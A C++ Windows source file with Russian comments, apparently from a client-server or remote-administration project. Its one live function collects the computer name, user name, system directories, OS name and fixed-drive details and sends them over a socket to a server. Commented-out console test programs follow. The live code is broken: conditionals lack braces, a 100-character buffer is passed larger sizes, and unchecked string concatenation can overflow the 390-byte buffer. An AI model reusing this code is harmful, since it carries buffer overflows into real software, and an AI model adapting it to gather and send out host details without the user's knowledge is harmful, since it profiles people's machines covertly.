#include "Header.h"
#include <sstream>
#define BUFFER_SIZE 390
void sendInformationSysteme(struct Data *data)
{
	char buffer[BUFFER_SIZE];
	LPTSTR lpszSystemInfo;
	DWORD cchBuff = 256;
	DWORD dwResult;
	TCHAR tchBuffer[100];
	lpszSystemInfo = tchBuffer;
	strcpy(buffer, "INFORMATION\n\n");
	if (GetComputerName(lpszSystemInfo, &cchBuff))
	
		strcat(buffer, "Computer name: ");
		strcat(buffer, lpszSystemInfo);
		strcat(buffer, "\n");
			// Получаем и отображаем имя пользователя.
		
			if (GetUserName(lpszSystemInfo, &cchBuff))
		
			strcat(buffer, "User name: ");
			strcat(buffer, lpszSystemInfo);
			strcat(buffer, "\n");
			// Получаем и отображаем системную директорию.
		
			if (GetSystemDirectory(lpszSystemInfo, MAX_PATH + 1))
		
			strcat(buffer, "System directory: ");
			strcat(buffer, lpszSystemInfo);
			strcat(buffer, "\n");
			// Получаем и отображаем директорию Windows.
		
			if (GetWindowsDirectory(lpszSystemInfo, MAX_PATH + 1))
			
			strcat(buffer, "Windows directory: ");
			strcat(buffer, lpszSystemInfo);
			strcat(buffer, "\n");
		
			dwResult = ExpandEnvironmentStrings(
				"OS=%OS%",
				lpszSystemInfo,
				BUFFER_SIZE);
			if (dwResult <= BUFFER_SIZE)
			strcat(buffer, lpszSystemInfo);
			strcat(buffer, "\n");

	int sz = GetLogicalDriveStrings(NULL, 0);
	TCHAR* szLogicalDrives = new TCHAR[sz];
	GetLogicalDriveStrings(sz, szLogicalDrives);
	strcat(buffer, "MEMORY AND FLAGS\n\n");
	while (*szLogicalDrives)
	{
		TCHAR szDisk[80];
		lstrcpy(szDisk, szLogicalDrives);
		GetDriveType(szDisk);
		UINT uDriveType = GetDriveType(szDisk);
		if (uDriveType == DRIVE_FIXED)
		{
			strcat(buffer, szDisk);
			strcat(buffer, "\n");
			strcat(buffer, "systems flags:\t");
			DWORD dwSystemFlags;
			GetVolumeInformation(szDisk, NULL, 0, NULL, 0, &dwSystemFlags, NULL, 0);
			int a = dwSystemFlags;
			char str[20];
			sprintf(str, "%d", a);
			strcat(buffer, str);
			strcat(buffer, "\n");
			//определяем объем      
			__int64 uliTotalBytes;
			GetDiskFreeSpaceEx(szDisk, NULL, (PULARGE_INTEGER)&uliTotalBytes, NULL);
			strcat(buffer, "size memory in disk:\t");
			a = uliTotalBytes / (1024 * 1024);
			sprintf(str, "%d", a);
			strcat(buffer, str);
			strcat(buffer, "MB\n");
		}
		while (*szLogicalDrives) szLogicalDrives++;
		szLogicalDrives++;
	}
	send(data->Server, buffer, BUFFER_SIZE, 0);
}




//#include <windows.h>
//#include <stdio.h>
//#include <stdlib.h>
//#include <conio.h>
//#include <locale.h>
//#define BUFSIZE 1024
//
//void main()
//{
//	setlocale(LC_CTYPE, "Russian");
//	LPTSTR lpszSystemInfo;      // указатель на строку, в которой
//								// будет информация о системе.
//	DWORD cchBuff = 256;        // длина имени компьютера или
//								// пользователя.
//	TCHAR tchBuffer[BUFSIZE];   // буфер для строки.
//
//	DWORD dwResult;             // возвращаемое значение функции.
//
//	lpszSystemInfo = tchBuffer;
//
//	// Получаем и отображаем имя компьютера.
//
//	if (GetComputerName(lpszSystemInfo, &cchBuff))
//		printf("Computer name:  %s\n", lpszSystemInfo);
//
//	// Получаем и отображаем имя пользователя.
//
//	if (GetUserName(lpszSystemInfo, &cchBuff))
//		printf("User name:  %s\n\n", lpszSystemInfo);
//
//	// Получаем и отображаем системную директорию.
//
//	if (GetSystemDirectory(lpszSystemInfo, MAX_PATH + 1))
//		printf("System directory:  %s\n", lpszSystemInfo);
//
//	// Получаем и отображаем директорию Windows.
//
//	if (GetWindowsDirectory(lpszSystemInfo, MAX_PATH + 1))
//		printf("Windows directory:  %s\n\n", lpszSystemInfo);
//
//
//	printf("Переменные окружения (partial list): \n");
//
//	// Получаем переменную окружения OS.
//
//	dwResult = ExpandEnvironmentStrings(
//		"OS=%OS%",
//		lpszSystemInfo,
//		BUFSIZE);
//	if (dwResult <= BUFSIZE)
//		printf("  %s\n", lpszSystemInfo);
//
//
//	// Получаем переменную окружения PATH.
//	printf("\n\n");
//	dwResult = ExpandEnvironmentStrings(
//		"PATH=%PATH%",
//		lpszSystemInfo,
//		BUFSIZE);
//	if (dwResult <= BUFSIZE)
//		printf("  %s\n", lpszSystemInfo);
//
//	// Получаем переменную окружения TMP.
//	printf("\n\n");
//	dwResult = ExpandEnvironmentStrings(
//		"TEMP=%TEMP%",
//		lpszSystemInfo,
//		BUFSIZE);
//	if (dwResult <= BUFSIZE)
//		printf("  %s\n", lpszSystemInfo);
//	getch();
//}
//# include <Windows.h>
//# include <conio.h>
//# include <iostream>
//# include <locale>
//int main()
//{
//	setlocale(LC_ALL, "rus");
//	int sz = GetLogicalDriveStrings(NULL, 0);
//	TCHAR* szLogicalDrives = new TCHAR[sz];
//	GetLogicalDriveStrings(sz, szLogicalDrives);
//
//	while (*szLogicalDrives)
//	{
//		TCHAR szDisk[80];
//		lstrcpy(szDisk, szLogicalDrives);
//		GetDriveType(szDisk);
//		UINT uDriveType = GetDriveType(szDisk);
//		if (uDriveType == DRIVE_FIXED)
//		{
//			std::wcout << szDisk << std::endl;
//			//определяем флаги
//			std::wcout << L"Системные флаги диска:\t";
//			DWORD dwSystemFlags;
//			GetVolumeInformation(szDisk, NULL, 0, NULL, 0, &dwSystemFlags, NULL, 0);
//			std::wcout << dwSystemFlags << L"\n";
//			//определяем объем      
//			__int64 uliTotalBytes;
//			GetDiskFreeSpaceEx(szDisk, NULL, (PULARGE_INTEGER)&uliTotalBytes, NULL);
//			std::wcout << L"Объем диска:\t" << uliTotalBytes / (1024 * 1024) << L" МБ\n";
//			std::wcout << std::endl;
//		}
//		while (*szLogicalDrives) szLogicalDrives++;
//		szLogicalDrives++;
//	}
//	getch();
//}
//#include <windows.h>
//#include <stdio.h>
//#include <conio.h>
//void main()
//{
//	SYSTEM_INFO siSysInfo;
//
//	// Копируем информацию о железе в структуру SYSTEM_INFO.
//
//	GetSystemInfo(&siSysInfo);
//
//	// Отображаем содержимое структуры SYSTEM_INFO.
//
//	printf("Hardware information: \n");
//	printf("  OEM ID: %u\n", siSysInfo.dwOemId);
//	printf("  Number of processors: %u\n",
//		siSysInfo.dwNumberOfProcessors);
//	printf("  Page size: %u\n", siSysInfo.dwPageSize);
//	printf("  Processor type: %u\n", siSysInfo.dwProcessorType);
//	printf("  Minimum application address: %lx\n",
//		siSysInfo.lpMinimumApplicationAddress);
//	printf("  Maximum application address: %lx\n",
//		siSysInfo.lpMaximumApplicationAddress);
//	printf("  Active processor mask: %u\n",
//		siSysInfo.dwActiveProcessorMask);
//	getch();
//}